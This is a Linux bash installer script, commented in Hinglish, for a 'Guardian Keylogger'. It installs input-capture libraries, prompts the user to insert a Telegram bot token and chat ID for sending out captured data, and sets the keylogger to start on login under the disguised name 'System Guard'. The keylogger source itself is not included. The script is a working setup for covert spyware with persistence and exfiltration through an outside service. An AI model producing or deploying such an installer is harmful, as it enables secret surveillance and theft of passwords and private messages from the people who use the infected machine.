cat > install.sh << 'EOF'
#!/bin/bash
echo "====================================="
echo "   Guardian Keylogger Installer (Linux)"
echo "====================================="

echo "Dependencies install kar raha hoon..."
sudo apt install xdotool -y

# Virtual Environment (safe tarika)
python3 -m venv venv
source venv/bin/activate
pip install pynput requests psutil

echo ""
echo "✅ Dependencies install ho gaye!"
echo ""
echo "⚠️  Ab keylogger.py file khol ke apna"
echo "   TELEGRAM_BOT_TOKEN aur CHAT_ID daal do."
echo "   Command: nano keylogger.py"
echo ""
read -p "Config daal ke Enter dabaao..."

# Auto-start setup
echo "Auto-start setup kar raha hoon..."
mkdir -p \~/.config/autostart

cat > \~/.config/autostart/guardian-keylogger.desktop << EOC
[Desktop Entry]
Type=Application
Name=System Guard
Exec=$(pwd)/venv/bin/python3 $(pwd)/keylogger.py
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
EOC

echo ""
echo "✅ Setup complete ho gaya!"
echo "Ab laptop restart karke test kar."
echo "Manual test karne ke liye: source venv/bin/activate && python3 keylogger.py"
EOF
